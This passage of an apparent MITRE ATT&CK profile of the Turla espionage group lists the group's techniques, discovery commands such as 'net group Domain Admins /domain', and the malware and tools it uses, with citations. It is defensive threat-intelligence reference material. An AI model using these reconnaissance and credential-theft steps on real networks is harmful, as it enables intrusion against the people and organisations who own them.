Obfuscated Files or Information: Command Obfuscation Turla has used encryption (including salted 3DES via PowerSploit's Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.[11] .011 Obfuscated Files or Information: Fileless Storage Turla has used the Registry to store encrypted and encoded payloads.[11][18] Enterprise T1588 .001 Obtain Capabilities: Malware Turla has used malware obtained after compromising other threat actors, such as OilRig.[21][22] .002 Obtain Capabilities: Tool Turla has obtained and customized publicly-available tools like Mimikatz.[18] Enterprise T1201 Password Policy Discovery Turla has used net accounts and net accounts /domain to acquire password policy information.[14] Enterprise T1120 Peripheral Device Discovery Turla has used fsutil fsinfo drives to list connected drives.[14] Enterprise T1069 .001 Permission Groups Discovery: Local Groups Turla has used net localgroup and net localgroup Administrators to enumerate group information, including members of the local administrators group.[14] .002 Permission Groups Discovery: Domain Groups Turla has used net group \"Domain Admins\" /domain to identify domain administrators.[14] Enterprise T1566 .002 Phishing: Spearphishing Link Turla attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.[4] Enterprise T1057 Process Discovery Turla surveys a system upon check-in to discover running processes using the tasklist /v command.[1] Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.[11] Enterprise T1055 Process Injection Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.[11] .001 Dynamic-link Library Injection Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.[16][24] Enterprise T1090 Proxy Turla RPC backdoors have included local UPnP RPC proxies.[11] .001 Internal Proxy Turla has compromised internal network systems to act as a proxy to forward traffic to C2.[10] Enterprise T1012 Query Registry Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.[1] Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .[11] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Turla used net use commands to connect to lateral systems within a network.[1] Enterprise T1018 Remote System Discovery Turla surveys a system upon check-in to discover remote systems on a local network using the net view and net view /DOMAIN commands. Turla has also used net group \"Domain Computers\" /domain, net group \"Domain Controllers\" /domain, and net group \"Exchange Servers\" /domain to enumerate domain computers, including the organization's DC and Exchange Server.[1][14] Enterprise T1518 .001 Software Discovery: Security Software Discovery Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected.[14] Enterprise T1553 .006 Subvert Trust Controls: Code Signing Policy Modification Turla has modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.[23][25] Enterprise T1082 System Information Discovery Turla surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.[1][14] Enterprise T1016 System Network Configuration Discovery Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, net config, ipconfig /all, and route commands, as well as NBTscan.[1][18][14] Turla RPC backdoors have also retrieved registered RPC interface information from process memory.[11] .001 Internet Connection Discovery Turla has used tracert to check internet connectivity.[14] Enterprise T1049 System Network Connections Discovery Turla surveys a system upon check-in to discover active local network connections using the netstat -an, net use, net file, and net session commands.[1][14] Turla RPC backdoors have also enumerated the IPv4 TCP connection table via the GetTcpTable2 API call.[11] Enterprise T1007 System Service Discovery Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.[1] Enterprise T1124 System Time Discovery Turla surveys a system upon check-in to discover the system time by using the net time command.[1] Enterprise T1204 .001 User Execution: Malicious Link Turla has used spearphishing via a link to get users to download and run their malware.[4] Enterprise T1078 .003 Valid Accounts: Local Accounts Turla has abused local accounts that have the same password across the victim\u2019s network.[15] Enterprise T1102 Web Service Turla has used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.[13][15] .002 Bidirectional Communication A Turla JavaScript backdoor has used Google Apps Script as its C2 server.[4][16] Software ID Name References Techniques S0099 Arp [1] Remote System Discovery, System Network Configuration Discovery S0335 Carbon [26][6] Application Layer Protocol: Web Protocols, Create or Modify System Process: Windows Service, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Non-Application Layer Protocol, Obfuscated Files or Information, Permission Groups Discovery, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Remote System Discovery, Scheduled Task/Job: Scheduled Task, System Network Configuration Discovery, System Network Connections Discovery, System Time Discovery, Web Service S0160 certutil [18] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0126 ComRAT [8][20][6] Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Hide Artifacts: Hidden File System, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Embedded Payloads, Process Injection: Dynamic-link Library Injection, Query Registry, Scheduled Task/Job: Scheduled Task, Scheduled Transfer, Software Discovery, System Time Discovery, Web Service: Bidirectional Communication S0538 Crutch [15][10] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Automated Exfiltration, Data from Local System, Data from Removable Media, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Fallback Channels, Hijack Execution Flow: DLL, Masquerading: Masquerade Task or Service, Peripheral Device Discovery, Scheduled Task/Job: Scheduled Task, Web Service: Bidirectional Communication S0363 Empire [27][15] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0091 Epic [1][6] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Library, Archive Collected Data, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Indicator Removal: File Deletion, Obfuscated Files or Information, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Extra Window Memory Injection, Query Registry, Remote System Discovery, Software Discovery: Security Software Discovery, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Service Discovery, System Time Discovery S0168 Gazer [2] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Winlogon Helper DLL, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Screensaver, Execution Guardrails: Mutual Exclusion, Hide Artifacts: NTFS File Attributes, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information: Encrypted/Encoded File, Process Injection: Thread Execution Hijacking, Process Injection, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Owner/User Discovery S0537 HyperStack [13] Account Discovery: Local Account, Encrypted Channel: Symmetric Cryptography, Inter-Process Communication, Modify Registry, Native API, Valid Accounts: Default Accounts S0581 IronNetInjector [20] Command and Scripting Interpreter: Python, Deobfuscate/Decode Files or Information, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Task/Job: Scheduled Task S0265 Kazuar [28][10] Account Discovery: Local Account, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Destruction, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Obfuscated Files or Information, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy: Internal Proxy, Scheduled Transfer, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S1075 KOPILUWAK [29] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: JavaScript, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, Network Share Discovery, Phishing: Spearphishing Attachment, Process Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, User Execution: Malicious File S0395 LightNeuron [30][6] Application Layer Protocol: Mail Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Data Manipulation: Transmitted Data Manipulation, Data Obfuscation: Steganography, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Email Collection: Remote Email Collection, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Transfer, Server Software Component: Transport Agent, System Information Discovery, System Network Configuration Discovery S1143 LunarLoader [19] Deobfuscate/Decode Files or Information, Execution Guardrails, Office Application Startup: Add-ins, Reflective Code Loading, System Network Configuration Discovery S1142 LunarMail [19] Application Layer Protocol: Mail Protocols, Command and Scripting Interpreter: Visual Basic, Create or Modify System Process, Data Obfuscation: Steganography, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Email Collection: Local Email Collection, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Mailbox Data, Indicator Removal: File Deletion, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Office Application Startup: Add-ins, Screen Capture, System Information Discovery, User Execution: Malicious File S1141 LunarWeb [19] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Library, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data Obfuscation: Steganography, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Group Policy Discovery, Indicator Removal: File Deletion, Inter-Process Communication, Multi-Stage Channels, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery: Local Groups, Process Discovery, Protocol Tunneling, Proxy, Software Discovery, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: Time Based Evasion, Windows Management Instrumentation S0002 Mimikatz [16][18] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0256 Mosquito [4][16][6] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Component Object Model Hijacking, Indicator Removal: File Deletion, Ingress Tool Transfer, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Fileless Storage, Process Discovery, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Owner/User Discovery, Windows Management Instrumentation S0590 NBTscan [18] Network Service Discovery, Network Sniffing, Remote System Discovery, System Network Configuration Discovery, System Owner/User Discovery S0102 nbtstat [1] System Network Configuration Discovery, System Network Connections Discovery S0039 Net [1] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [1] System Network Connections Discovery S0587 Penquin [7] Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Network Sniffing, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Encrypted/Encoded File, Scheduled Task/Job: Cron, System Information Discovery, System Network Configuration Discovery, Traffic Signaling, Traffic Signaling: Socket Filters S0393 PowerStallion [11] Command and Scripting Interpreter: PowerShell, Indicator Removal: Timestomp, Obfuscated Files or Information, Process Discovery, Web Service: Bidirectional Communication S0029 PsExec [18] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0075 Reg [1] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry S0096 Systeminfo [1][19] System Information Discovery S0057 Tasklist [1] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery S0668 TinyTurla [10] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Asymmetric Cryptography, Fallback Channels, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information: Fileless Storage, Query Registry, Scheduled Transfer, System Services: Service Execution S0022 Uroburos [1][5] Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Non-Standard Encoding, Data from Local System, Data Obfuscation: Junk Data, Data Obfuscation: Protocol or Service Impersonation, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Hide Artifacts: Hidden File System, Indicator Removal: File Deletion, Ingress Tool Transfer, Inter-Process Communication, Masquerading: Masquerade Task or Service, Modify Registry, Multi-Stage Channels, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Embedded Payloads, Process Discovery, Process Injection: Dynamic-link Library Injection, Protocol Tunneling, Proxy: Multi-hop Proxy, Query Registry, Reflective Code Loading, Rootkit, System Information Discovery, Traffic Signaling References Kaspersky Lab's Global Research and Analysis Team. (2014, August 7). The Epic Turla Operation: Solving some of the mysteries of Snake/Uroburos. Retrieved December 11, 2014. ESET. (2017, August). Gazing at Gazer: Turla\u2019s new second stage backdoor. Retrieved September 14, 2017. Meyers, A. (2018, March 12). Meet CrowdStrike\u2019s Adversary of the Month for March: VENOMOUS BEAR. Retrieved May 16, 2018. ESET, et al. (2018, January). Diplomats in Eastern Europe bitten by a Turla mosquito. Retrieved July 3, 2018. FBI et al. (2023, May 9). Hunting Russian Intelligence \u201cSnake\u201d Malware. Retrieved June 8, 2023. Secureworks CTU. (n.d.). IRON HUNTER. Retrieved February 22, 2022. Leonardo. (2020, May 29). MALWARE TECHNICAL INSIGHT TURLA \u201cPenquin_x64\u201d. Retrieved March 11, 2021. Symantec. (2015, January 26). The Waterbug attack group. Retrieved April 10, 2015. Kaspersky Lab's Global Research & Analysis Team. (2017, August 30). Introducing WhiteBear. Retrieved September 21, 2017. Cisco Talos. (2021, September 21). TinyTurla - Turla deploys new malware to keep a secret backdoor on victim machines. Retrieved December 2, 2021. Faou, M. and Dumont R.. (2019, May 29). A dive into Turla PowerShell usage. Retrieved June 14, 2019. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Accenture. (2020, October). Turla uses HyperStack, Carbon, and Kazuar to compromise government entity. Retrieved December 2, 2020. Faou, M. (2020, May). From Agent.btz to ComRAT v4: A ten-year journey. Retrieved June 15, 2020. Faou, M. (2020, December 2). Turla Crutch: Keeping the \u201cback door\u201d open. Retrieved December 4, 2020. ESET Research. (2018, May 22). Turla Mosquito: A shift towards more generic tools. Retrieved July 3, 2018. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Symantec DeepSight Adversary Intelligence Team. (2019, June 20). Waterbug: Espionage Group Rolls Out Brand-New Toolset in Attacks Against Governments. Retrieved July 8, 2019. Jur\u010dacko, F. (2024, May 15). To the Moon and back(doors): Lunar landing in diplomatic missions. Retrieved June 26, 2024. Reichel, D. (2021, February 19). IronNetInjector: Turla\u2019s New Malware Loading Tool. Retrieved February 24, 2021. NSA/NCSC. (2019, October 21). Cybersecurity Advisory: Turla Group Exploits Iranian APT To Expand Coverage Of Victims. Retrieved October 16, 2020. Insikt Group. (2020, March 12). Swallowing the Snake\u2019s Tail: Tracking Turla Infrastructure. Retrieved September 16, 2024. Reichel, D. and Idrizovic, E. (2020, June 17). AcidBox: Rare Malware Repurposing Turla Group Exploit Targeted Russian Organizations. Retrieved March 16, 2021. Rapid7. (2013, November 26). meterpreter/source/extensions/priv/server/elevate/. Retrieved July 8, 2018. TDL Project. (2016, February 4). TDL (Turla Driver Loader). Retrieved April 22, 2021. ESET. (2017, March 30). Carbon Paper: Peering into Turla\u2019s second stage backdoor. Retrieved November 7, 2018. ESET. (2018, August). Turla Outlook Backdoor: Analysis of an unusual Turla backdoor. Retrieved March 11, 2019. Levene, B, et al. (2017, May 03). Kazuar: Multiplatform Espionage Backdoor with API Access. Retrieved July 17, 2018. Hawley, S. et al. (2023, February 2). Turla: A Galaxy of Opportunity. Retrieved May 15, 2023. Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019. "
}
]